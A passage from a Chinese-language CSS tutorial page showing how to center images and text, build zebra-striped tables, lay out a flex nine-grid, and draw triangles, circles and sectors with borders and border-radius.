center;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>利用Display: table;实现img图片垂直居中</li></ol><p>给最外层的div设置display属性为table;img的父元素div设置display:table-cell,vertical-align: middle;<strong>如果你也想实现水平居中，你可以给最外层的div元素添加text-align: center属</strong>性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;tablebox&quot;&gt;</span><br><span class="line">    &lt;div id=&quot;imgbox&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.tablebox&#123;width: 300px;height: 250px;background: #fff;display: table&#125;</span><br><span class="line">#imgbox&#123;display: table-cell;vertical-align: middle;&#125;</span><br><span class="line">#imgbox img&#123;width: 100px&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>用绝对定位实现垂直居中（推荐-兼容性好）</li></ol><ul><li>给img的父元素添加相对定位属性（position: relative），同时，要给子元素也就是图片img元素添加绝对定位属性（position: absolute）。</li><li>将图片元素的top属性设置为50%。</li><li>现在我们需要给img元素设置一个负的margin-top值，<font color="#FF00FF">这个值为你想要实现垂直居中的元素高度的一半，*如果不确定元素的高度，可以不使用margin-top，而是使用transform:translateY(-50%);属性</font>。</li></ul><p>记住：如果你想要同时实现水平居中，那么你可以用实现垂直居中的一样的技巧来实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body&#123;background: #ccc;&#125;</span><br><span class="line">.posdiv&#123;width: 300px;height: 250px;background: #fff;position: relative; margin:0 auto&#125;</span><br><span class="line">.posdiv img&#123;width: 100px;position: absolute;top: 50%;margin-top: -50px;&#125;</span><br></pre></td></tr></table></figure><h1 id="设置斑马线表格-纯css"><a href="#设置斑马线表格-纯css" class="headerlink" title="设置斑马线表格(纯css)"></a>设置斑马线表格(纯css)</h1><p><img src="http://files.shanqianche.cn/20228/1659667287150.png" alt="斑马线表格"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line"> &lt;title&gt;斑马线表格&lt;/title&gt;</span><br><span class="line"> &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"> *&#123;</span><br><span class="line">  margin: 0;</span><br><span class="line">  padding: 0;</span><br><span class="line">  /*清处浏览器默认设置*/</span><br><span class="line"> &#125;</span><br><span class="line"> table&#123;</span><br><span class="line">  /*表格的外边距和大小*/</span><br><span class="line">  margin: 10px 0 0 0;</span><br><span class="line">  width: 100%;</span><br><span class="line">  border-spacing: 0;</span><br><span class="line">  border-collapse: collapse;</span><br><span class="line">  /*collapse 表格单元格边框合并 </span><br><span class="line">   border-spacing 表格单元格间距为零</span><br><span class="line">  */</span><br><span class="line"> &#125;</span><br><span class="line"> caption&#123;</span><br><span class="line">  font: 30px &quot;楷体&quot;;</span><br><span class="line">  padding: 5px;</span><br><span class="line">  /*表格标题*/</span><br><span class="line"> &#125;</span><br><span class="line"> td&#123;</span><br><span class="line">  width: 32%;</span><br><span class="line">  height: 50px;</span><br><span class="line">  /*单元格大小*/</span><br><span class="line"> &#125;</span><br><span class="line"> tbody td&#123;</span><br><span class="line">   border: 1px solid;</span><br><span class="line">   /*表格主体的边框*/</span><br><span class="line"> &#125;</span><br><span class="line"> thead&#123;</span><br><span class="line">  background-color: #A2A5A7;</span><br><span class="line">  /*表格头部*/</span><br><span class="line"> &#125;</span><br><span class="line"> tr:hover&#123;</span><br><span class="line">  background-color: #66D9EF;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">  /*鼠标悬停在表格上时，表格的背景和鼠标的形状*/</span><br><span class="line"> &#125;</span><br><span class="line"> table tbody tr:nth-child(even)&#123;</span><br><span class="line">  background-color: #8F908A;</span><br><span class="line">  box-shadow: inset 0 5px rgba(255,255,255,0.5);</span><br><span class="line">  /*even为偶数行 odd为奇数行</span><br><span class="line">    设置表格的主体部分偶数行的样式</span><br><span class="line">    shadow 阴影  inset将外部阴影改为内部阴影</span><br><span class="line">  */</span><br><span class="line"> &#125;</span><br><span class="line"> thead tr th:first-child</span><br><span class="line"> &#123;</span><br><span class="line">  /*表头部分th 第一个th左上角设置圆角*/</span><br><span class="line">  border-radius: 15px 0 0 0;</span><br><span class="line"> &#125;</span><br><span class="line"> thead tr td:last-child&#123;</span><br><span class="line">  /*最后一个单元格右上角设置圆角*/</span><br><span class="line">  border-radius: 0 15px 0 0;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;table&gt;</span><br><span class="line"> &lt;caption&gt;斑马线表格&lt;/caption&gt;</span><br><span class="line"> &lt;thead&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;th&gt;&lt;/th&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line"> &lt;/thead&gt;</span><br><span class="line"> &lt;tbody&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;td&gt;&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line"> &lt;/tbody&gt;</span><br><span class="line">  &lt;tfoot&gt;</span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;&lt;/td&gt;</span><br><span class="line">   &lt;/tr&gt;</span><br><span class="line">  &lt;/tfoot&gt;</span><br><span class="line"> &lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="文本元素如何居中"><a href="#文本元素如何居中" class="headerlink" title="文本元素如何居中"></a>文本元素如何居中</h1><ol><li>CSS设置文字水平居中</li></ol><p>在CSS中可以使用text-align属性来设置文字水平居中。该属性规定元素中的文本的水平对齐方式，通过使用center值设置文本居中。<br>text-align是一个基本的属性，它会影响一个元素中的文本行互相间的对齐方式。值left、right和center会导致元素中的文本分别左对齐、右对齐和居中，想要使文本居中，直接使用center即可。<br><strong>该属性设置文本和img标签等一些内联对象（或与之类似的元素）的居中</strong>。<br><strong>该属性有如下几个特点：</strong></p><ul><li>text-align的center应用在一个容器上，它只针对容器里面的文字以及容器里面的display为inline或者inline-block的容器，<font color="#FF00FF">如果里面的容器display为block，则里面的容器的内容不会居中</font>。</li><li>text-align<font color="#FF00FF">具有向下传递性，会不断地向子元素传递。如果设置一个div，则其子div中的内容也会居中</font>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 水平居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 400px;</span><br><span class="line">                height: 100px;</span><br><span class="line">                background: pink;</span><br><span class="line">                text-align:center;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 水平居中了--文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>CSS设置字体垂直居中</li></ol><p><strong>单行文字垂直居中</strong><br>对于单行文本，我们只需要将文本行高(line-height属性)和所在区域高度(height)设置一致就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                height: 300px;</span><br><span class="line">                background: paleturquoise;</span><br><span class="line">                line-height:300px;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 垂直居中了--文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>多行文本垂直居中</strong><br>说明：多行文本垂直居中分为两种情况，一个是父级元素高度不固定，随着内容变化；另一个是父级元素高度固定。</p><ul><li>父级元素高度不固定</li></ul><p>父级高度不固定的时，高度只能通过内部文本来撑开。所以，我们可以通过设置内填充（padding）的值来使文本看起来垂直居中<font color="#FF00FF">，只需设置padding-top和padding-bottom的值相等</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            .box &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                margin: 50px auto;</span><br><span class="line">                background: paleturquoise;</span><br><span class="line">                padding: 50px 20px;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot;&gt;css 垂直居中了--文本文字,文本文字,文本文字,文本文字,文本文字,文本文字&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>父级元素高度固定</li></ul><p><font color="#FF00FF">使用vertical-align:middle +display:table-cell 使文字垂直居中</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;css 垂直居中&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .box &#123;</span><br><span class="line">        width: 300px;</span><br><span class="line">        height: 300px;</span><br><span class="line">        background: paleturquoise;</span><br><span class="line">        vertical-align: middle;</span><br><span class="line">        display: table-cell;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">      css 垂直居中了--文本文字,文本文字,文本文字,文本文字,文本文字,文本文字。</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>说明：vertical-align:middle +display:table-cell能够使单行文字、多行文字都居中。<font color="#FF00FF">但是因为 table-cell 是 inline 类型，所以会导致原来的块级元素每个 div 一行移动到了同一行。如果需要分列两行，需要在外面额外添加容器对位置进行控制</font></p></blockquote><h1 id="用flex实现九宫格讲思路"><a href="#用flex实现九宫格讲思路" class="headerlink" title="用flex实现九宫格讲思路"></a>用flex实现九宫格讲思路</h1><blockquote><p>利用了padding-top和flex-wrap:wrap，当设置background-color时，是包括盒子模型中的content和padding的，但是为什么不设置height呢？因为父元素没有高度，所以定义height:30%是没有用的，且若想每个block都为正方形，最好的方式就是设置padding-top/padding-bottom：a%，因为此时的百分比是父元素宽度的百分比，而width也为父元素宽度的百分比，所以block可以成为正方形。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .block &#123;</span><br><span class="line">      padding-top: 30%;</span><br><span class="line">      margin-top: 3%;</span><br><span class="line">      border-radius: 10%;</span><br><span class="line">      background-color: orange;</span><br><span class="line">      width: 30%;</span><br><span class="line">    &#125;</span><br><span class="line">    .container-flex2 &#123;</span><br><span class="line">      display: flex;</span><br><span class="line">      flex-wrap: wrap;</span><br><span class="line">      justify-content: space-around;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container-flex2&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;block&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CSS实现一个等腰三角形"><a href="#CSS实现一个等腰三角形" class="headerlink" title="CSS实现一个等腰三角形"></a>CSS实现一个等腰三角形</h1><p>主要是通过把宽高设置成0，边框宽度设置宽一些，设置其中三个边透明，只留一个边显示</p><p>等边三角形是特殊的等腰三角形，它的三条边都相等，顶角为60度，而高是边长的3^(1/2)/2倍，约等于0.866……假设底为160px，则高约为138.56px，因此要做边长为160px的等边三角形，可以这么做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;测试&lt;/title&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        div &#123;</span><br><span class="line">             width:0px;height:0px;margin:100px auto;</span><br><span class="line">             border-left:80px solid transparent; </span><br><span class="line">             border-right:80px solid transparent; </span><br><span class="line">             border-bottom:138.56px solid #A962CE; /*--三角形的高--*/</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>扩展：</strong></p><p>用CSS实现一个等边三角形：<br>根据各个边之间的长度关系，我们易知：需要展示的边框的宽度：相邻的透明的边框的宽度 = √3 ：1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.triangle&#123;</span><br><span class="line">    width: 0px;</span><br><span class="line">    height: 0px;</span><br><span class="line">    border-left: 10px solid transparent;</span><br><span class="line">    border-right: 10px solid transparent;;</span><br><span class="line">    border-top: 17.32px solid transparent;</span><br><span class="line">    border-bottom: 17.32px solid red; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实现扇形、圆形"><a href="#实现扇形、圆形" class="headerlink" title="实现扇形、圆形"></a>实现扇形、圆形</h1><ol><li>圆形：</li></ol><p>border-radius圆角的四个值按顺序取值分别为：左上、右上、右下、左下。这里只设置一个值，代表四个角的取值都为为50%</p><p>原理：border-radius: 50% 弯曲元素的边框以创建圆。<br>由于圆在任何给定点具有相同的半径，故宽和高都需要保证一样的值，不同的值将创建椭圆。<br>2. 扇形：</p><ul><li> 利用border-radius，实现90度角的扇形：</li></ul><p>原理：<br>左上角是圆角，其余三个角都是直角：左上角的值为宽和高一样的值，其他三个角的值不变（等于0）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;sector&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .sector &#123;</span><br><span class="line">        border-radius: 80px 0 0;</span><br><span class="line">        width: 80px;</span><br><span class="line">        height: 80px;</span><br><span class="line">        background: #666;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong>绘制任意角度的扇形</strong></p><p><img src="http://files.shanqianche.cn/20228/1659669167367.png" alt="任意角度扇形"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div class=&quot;shanxing shanxing1&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!--*绘制一个85度扇形*/--p&gt;</span><br><span class="line">&lt;div class=&quot;shanxing shanxing2&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">     &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--*绘制一个向右扇形，90度扇形*--&gt;</span><br><span class="line">    &lt;div class=&quot;shanxing shanxing3&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!--*绘制一个颜色扇形 */--p&gt;</span><br><span class="line">&lt;div class=&quot;shanxing shanxing4&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">     &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;!--/*绘制一个不同颜色半圆夹角 */--&gt;</span><br><span class="line">    &lt;div class=&quot;shanxing shanxing5&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;sx1&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;sx2&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .shanxing&#123;</span><br><span class="line">          position: relative;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: yellow;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      .sx1&#123;</span><br><span class="line">          position: absolute;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          transform: rotate(0deg);</span><br><span class="line">          clip: rect(0px,100px,200px,0px); /*这个clip属性用来绘制半圆，在clip的rect范围内的内容显示出来，使用clip属性，元素必须是absolute的 */</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: #f00;</span><br><span class="line">          /*-webkit-animation: an1 2s infinite linear; */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      .sx2&#123;</span><br><span class="line">          position: absolute;</span><br><span class="line">          width: 200px;</span><br><span class="line">          height: 200px;</span><br><span class="line">          transform: rotate(0deg);</span><br><span class="line">          clip: rect(0px,100px,200px,0px);</span><br><span class="line">          border-radius: 100px;</span><br><span class="line">          background-color: #f00;</span><br><span class="line">          /*-webkit-animation: an2 2s infinite linear;*/</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      /*绘制一个60度扇形*/</span><br><span class="line">      